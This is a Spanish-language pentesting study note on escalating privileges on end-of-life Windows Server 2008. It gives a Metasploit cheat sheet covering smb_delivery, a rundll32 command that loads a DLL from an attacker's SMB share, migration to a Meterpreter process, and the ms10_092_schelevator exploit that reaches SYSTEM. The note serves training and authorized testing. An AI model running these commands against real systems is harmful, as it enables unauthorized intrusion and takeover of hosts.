---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- Windows Server 2008/2008 R2 llegó a su End-of-Life (EOL) el 14 de enero de 2020; carece de protecciones modernas (Credential Guard, Device Guard, ATP, Control Flow Guard, AppLocker completo), lo que lo hace altamente vulnerable a exploits de kernel/escalada de privilegios local.
- La metodología clave es: enumerar parches faltantes (manual o con scripts) -> correlacionar KBs/CVEs con exploits conocidos (Metasploit/Exploit-DB) -> obtener shell inicial -> escalar privilegios con el exploit local correspondiente.
- Muchos exploits de kernel de esa época están compilados para arquitecturas específicas (x86/x64); si el proceso desde el que se ejecuta el exploit no coincide con la arquitectura objetivo, el exploit falla silenciosamente. Es obligatorio migrar a un proceso de la arquitectura correcta antes de lanzar el exploit local.
- En contextos reales (hospitales, universidades, gobierno), los sistemas legacy a menudo no se pueden simplemente "actualizar o retirar"; el pentester debe documentar controles compensatorios (segmentación de red, soporte extendido, etc.) en el reporte, no solo recomendar el parcheo.

## Herramientas Clave

- **wmic qfe**: comando nativo de Windows para listar los hotfixes/KBs instalados; permite identificar rápidamente el nivel de parcheo sin subir herramientas externas.
- **Sherlock (Sherlock.ps1)**: script de PowerShell que enumera vulnerabilidades de escalada de privilegios conocidas comparando el sistema contra una base de CVEs/MSBulletins, indicando el estado ("Appears Vulnerable", "Not Vulnerable", "Not supported on 64-bit systems").
- **Windows-Exploit-Suggester**: script en Python que toma la salida de `systeminfo` y la compara contra la base de datos de vulnerabilidades de Microsoft, sugiriendo módulos de Metasploit aplicables a los parches faltantes.
- **Metasploit Framework (msfconsole)**: usado tanto para la entrega del payload inicial (`exploit/windows/smb/smb_delivery`) como para la escalada de privilegios local (`exploit/windows/local/ms10_092_schelevator`).
- **Meterpreter**: shell post-explotación usada para migración de procesos, enumeración (`ps`, `getuid`, `sysinfo`) y pivote a módulos de post-explotación.
- **rdesktop / xfreerdp**: clientes RDP para acceso gráfico al objetivo; usados como alternativa cuando uno de los dos presenta errores de compatibilidad.

## Metodología Paso a Paso

### Fase 1: Enumeración del Nivel de Parches
El objetivo es determinar qué actualizaciones de seguridad faltan en el host para correlacionarlas con exploits conocidos.
1. Ejecutar `wmic qfe` desde una shell `cmd` para listar los KBs instalados de forma nativa (sin subir herramientas).
2. Buscar manualmente en internet el hotfix más reciente instalado para estimar qué tan desactualizado está el sistema.
3. Si es posible cargar scripts, ejecutar Sherlock para obtener un listado automatizado de vulnerabilidades potenciales con su CVE, boletín de Microsoft y enlace al exploit en Exploit-DB.
4. Alternativamente, usar Windows-Exploit-Suggester con la salida de `systeminfo` si no se puede cargar Sherlock, o si se requiere correlación directa con módulos de Metasploit.

### Fase 2: Obtención de Shell Inicial (Acceso)
El objetivo es obtener una shell de Meterpreter en el objetivo aprovechando un servicio expuesto (SMB en este caso).
1. Configurar el módulo `exploit/windows/smb/smb_delivery` en Metasploit, estableciendo `SRVHOST`/`LHOST` con la IP del atacante.
2. Seleccionar el target `DLL` (Id 0) para generar un comando `rundll32.exe` que apunte a un recurso compartido SMB controlado por el atacante.
3. Ejecutar manualmente el comando `rundll32.exe` generado en una consola `cmd` del objetivo (esto simula la ejecución que en un escenario real provendría de ingeniería social, una tarea programada, GPO, etc.).
4. Recibir la sesión de Meterpreter entrante en el listener.

### Fase 3: Preparación para Escalada (Migración de Arquitectura)
El objetivo es garantizar que el exploit de privilege escalation corra en un proceso compatible con su arquitectura objetivo.
1. Listar procesos con `ps` dentro de Meterpreter e identificar uno estable de arquitectura x64 (el payload inicial puede haber caído en un proceso x86 como `rundll32.exe`).
2. Migrar con `migrate <PID>` al proceso x64 elegido (ej. `conhost.exe`, `explorer.exe`).
3. Poner la sesión en segundo plano con `background` para volver al prompt principal de Metasploit.

### Fase 4: Búsqueda y Configuración del Exploit Local
El objetivo es encontrar el módulo de Metasploit correspondiente al CVE identificado en la Fase 1 y configurarlo contra la sesión activa.
1. Buscar el módulo por CVE con `search <CVE-ID>` (ej. `search 2010-3338` para el CVE de Task Scheduler XML).
2. Seleccionar el módulo (`use <id/ruta>`).
3. Configurar `SESSION` (la sesión de Meterpreter en background), `LHOST` (IP del atacante en la interfaz correspondiente, ej. tun0) y `LPORT` (puerto nuevo, distinto al de la shell inicial).
4. Verificar opciones con `show options` antes de ejecutar.

### Fase 5: Ejecución y Verificación de Privilegios
El objetivo es confirmar la elevación de privilegios y continuar con la post-explotación.
1. Ejecutar `exploit`; el módulo crea, valida, habilita, ejecuta y finalmente elimina una tarea programada maliciosa para obtener una nueva sesión elevada.
2. Verificar la nueva sesión con `getuid` (debe mostrar `NT AUTHORITY\SYSTEM`).
3. Confirmar información del sistema con `sysinfo`.
4. Continuar con la post-explotación necesaria (extracción de flags, dumps de credenciales, etc.).

## Cheat Sheet de Comandos

```cmd
:: Listar los hotfixes/KBs instalados de forma nativa (sin subir herramientas)
:: util para evaluar rapidamente que tan desactualizado esta el sistema
wmic qfe
```

```powershell
# Permitir la ejecucion de scripts solo para el proceso actual (bypass de Execution Policy)
Set-ExecutionPolicy bypass -Scope process

# Cargar el modulo Sherlock para enumeracion de vulnerabilidades de privesc
Import-Module .\Sherlock.ps1

# Ejecutar todas las comprobaciones de vulnerabilidades conocidas de Sherlock
Find-AllVulns
```

```shellsession
# --- ENTREGA DEL PAYLOAD INICIAL (SMB) ---

# Buscar el modulo de entrega via SMB
search smb_delivery

# Seleccionar el modulo de entrega SMB
use exploit/windows/smb/smb_delivery

# Revisar opciones del modulo y del payload
show options

# Ver los targets disponibles (DLL o PSH)
show targets

# Seleccionar target DLL (genera comando rundll32 para ejecutar en el objetivo)
set target 0

# Configurar IP del atacante para SRVHOST/LHOST (interfaz de la VPN/tun0)
set SRVHOST <ATTACKER_IP>
set LHOST <ATTACKER_IP>
set LPORT <ATTACKER_PORT>

# Lanzar el listener/servidor SMB en background
exploit
```

```cmd
:: Ejecutar en una consola cmd DENTRO del objetivo para activar el payload
:: la ruta y el nombre de archivo se generan dinamicamente al lanzar el modulo smb_delivery
rundll32.exe \\<ATTACKER_IP>\<SHARE_NAME>\<FILE_NAME>.dll,0
```

```shellsession
# --- ENUMERACION DENTRO DE METERPRETER (PRE-ESCALADA) ---

# Interactuar con una sesion especifica
sessions -i <SESSION_ID>

# Ver el PID del proceso actual de meterpreter
getpid

# Listar procesos para elegir uno de arquitectura x64 estable
ps

# Migrar a un proceso x64 (requerido para que exploits x64 funcionen)
migrate <PID_X64>

# Enviar la sesion actual a background para volver al prompt de msf
background
```

```shellsession
# --- BUSQUEDA Y CONFIGURACION DEL EXPLOIT LOCAL DE PRIVESC ---

# Buscar modulo de Metasploit por CVE identificado en la enumeracion
search <CVE-ID>

# Seleccionar el modulo de privilege escalation local encontrado
use exploit/windows/local/ms10_092_schelevator

# Indicar sobre que sesion de meterpreter correr el exploit
set SESSION <SESSION_ID>

# IP del atacante para el nuevo listener de la shell elevada
set LHOST <ATTACKER_IP>

# Puerto NUEVO y distinto al usado en la shell inicial
set LPORT <NEW_PORT>

# Revisar configuracion antes de ejecutar
show options

# Ejecutar el exploit de escalada de privilegios
exploit
```

```shellsession
# --- VERIFICACION POST-ESCALADA ---

# Confirmar el usuario actual (debe ser NT AUTHORITY\SYSTEM si la escalada fue exitosa)
getuid

# Confirmar informacion del sistema comprometido
sysinfo
```

```bash
# Alternativa de conexion RDP si xfreerdp falla por incompatibilidad con hosts legacy
rdesktop -u <USER> -p <PASSWORD> <TARGET_IP>
```

```bash
# Cliente RDP estandar (referencia, mencionado como el metodo primario antes del fallback)
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP>
```

## "Gotchas" y Troubleshooting

- **Arquitectura del proceso (CRITICO)**: si el exploit local objetivo (ej. `ms10_092_schelevator`) no es compatible con la arquitectura del proceso actual de Meterpreter, el exploit NO funcionara. Siempre verificar con `ps` y migrar a un proceso de la arquitectura correcta (`migrate <PID>`) antes de lanzar el exploit. Alternativa: elegir desde el inicio un payload de Meterpreter x64 en el paso de `smb_delivery`.
- **Exploits "Not supported on 64-bit systems"**: Sherlock puede marcar vulnerabilidades como no soportadas en sistemas de 64 bits; verificar siempre la arquitectura del objetivo (`sysinfo`) antes de intentar un exploit especifico.
- **Puerto LPORT duplicado**: usar un `LPORT` distinto al de la shell inicial al configurar el modulo de escalada de privilegios local, ya que el listener original sigue activo.
- **Limitaciones para subir herramientas**: en algunos escenarios reales puede haber restricciones para cargar herramientas (Sherlock, Windows-Exploit-Suggester) o guardar la salida de comandos al disco; en ese caso, recurrir a la enumeracion manual via `wmic qfe` / `systeminfo` y correlacionar manualmente con CVEs publicos.
- **xfreerdp con errores en hosts legacy**: si `xfreerdp` falla contra un Server 2008 (problemas de protocolo/compatibilidad), usar `rdesktop` como alternativa.
- **Contexto de reporte/riesgo**: al evaluar sistemas legacy en produccion criticos (ej. equipos medicos, software no soportado por el vendor), no recomendar unicamente "actualizar o retirar"; documentar controles de mitigacion existentes (segmentacion de red, soporte extendido de Microsoft, etc.) ya que la migracion puede ser costosa o inviable para el cliente.
- **Auditorias regulatorias**: en entornos con requisitos de cumplimiento estrictos, un sistema legacy puede implicar una calificacion reprobatoria en auditoria o perdida de fondos gubernamentales; esto debe reflejarse en la severidad del hallazgo en el reporte.